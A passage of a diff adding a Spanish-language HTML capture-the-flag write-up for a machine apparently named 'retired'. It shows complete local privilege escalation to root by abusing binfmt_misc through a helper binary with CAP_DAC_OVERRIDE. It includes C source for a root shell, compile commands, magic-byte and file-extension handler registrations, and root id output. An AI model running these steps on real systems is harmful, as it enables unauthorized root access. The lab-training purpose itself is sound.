+                        <code>/proc/sys/fs/binfmt_misc/register</code>
+                    </li>
+                    <li>Este archivo permite registrar manejadores de formato binario personalizados con el kernel</li>
+                    <li>El binario tiene la capacidad <code>CAP_DAC_OVERRIDE</code>, eludiendo comprobaciones de
+                        permisos de archivos</li>
+                    <li>No se requieren privilegios especiales (como sudo) para usar este programa</li>
+                </ul>
+
+                <p>De la página de manual <code>capabilities(7)</code>:</p>
+                <blockquote>
+                    <p><strong>CAP_DAC_OVERRIDE</strong>: Elude comprobaciones de permisos de lectura, escritura y
+                        ejecución de archivos. (DAC es una abreviatura de "discretionary access control".)</p>
+                </blockquote>
+
+                <h3>Formato de Registro de binfmt_misc</h3>
+                <p>Según la documentación del kernel, el formato de registro es:</p>
+                <pre><code class="language-plaintext">:name:type:offset:magic:mask:interpreter:flags</code></pre>
+
+                <p>Flags importantes:</p>
+                <ul>
+                    <li><strong>C</strong> - Ejecutar con las credenciales del binario (respeta bits SUID)</li>
+                </ul>
+
+                <h2>Método de Explotación 1 - Magic Bytes</h2>
+                <p>Registraré un manejador basado en magic bytes. Primero, extraigo los magic bytes de un binario SUID
+                    como <code>newgrp</code>:</p>
+
+                <pre><code class="language-bash">cat /usr/bin/newgrp | xxd -p | head -1 | sed 's/\(..\)/\\x\1/g'</code></pre>
+                <pre><code class="language-plaintext">\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x47\x00\x00\x00\x00</code></pre>
+
+                <p>A continuación, creo un programa simple en C para generar una shell privilegiada:</p>
+                <pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+    char *const paramList[10] = {"/bin/bash", "-p", NULL};
+    const int id = 0;
+    setresuid(id, id, id);
+    execve(paramList[0], paramList, NULL);
+    return 0;
+}</code></pre>
+
+                <p>Compilando el binario de escalada de privilegios:</p>
+                <pre><code class="language-bash">gcc -o /tmp/privesc /tmp/privesc.c</code></pre>
+
+                <p>Registrando el manejador de formato binario personalizado:</p>
+                <pre><code class="language-bash">echo ':pwn:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x47\x00\x00\x00\x00::/tmp/privesc:C' | /usr/lib/emuemu/reg_helper</code></pre>
+
+                <p>Verificando el registro:</p>
+                <pre><code class="language-bash">cat /proc/sys/fs/binfmt_misc/pwn</code></pre>
+                <pre><code class="language-plaintext">enabled
+interpreter /tmp/privesc
+flags: OC
+offset 0
+magic 7f454c4602010100000000000000000003003e0001000000d04700000000</code></pre>
+
+                <p>Ahora cuando ejecute cualquier binario que coincida con esos magic bytes (como <code>newgrp</code>),
+                    el kernel ejecutará en su lugar <code>/tmp/privesc</code> con los permisos del archivo original
+                    (SUID root):</p>
+
+                <pre><code class="language-bash">newgrp</code></pre>
+                <pre><code class="language-bash">root@retired:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1001(dev)</code></pre>
+
+                <h2>Método de Explotación 2 - Extensión de Archivo</h2>
+                <p>Un enfoque alternativo usando extensiones de archivo. Primero, creo un enlace simbólico con una
+                    extensión personalizada a un binario SUID:</p>
+
+                <pre><code class="language-bash">ln -s /usr/bin/passwd /tmp/exploit.pwn</code></pre>
+
+                <p>Registro un manejador para la extensión <code>.pwn</code>:</p>
+                <pre><code class="language-bash">echo ':pwn2:E::pwn::/tmp/privesc:C' | /usr/lib/emuemu/reg_helper</code></pre>
+
+                <p>Verificando el registro:</p>
+                <pre><code class="language-bash">cat /proc/sys/fs/binfmt_misc/pwn2</code></pre>
+                <pre><code class="language-plaintext">enabled
+interpreter /tmp/privesc
+flags: OC
+extension .pwn</code></pre>
+
+                <p>Ejecutar el enlace simbólico desencadena el intérprete con privilegios SUID:</p>
+                <pre><code class="language-bash">/tmp/exploit.pwn</code></pre>
+                <pre><code class="language-bash">root@retired:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1001(dev)</code></pre>
+
+                <p>Ambos métodos escalan exitosamente privilegios a root. Ahora puedo recuperar la flag de root y
+                    completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
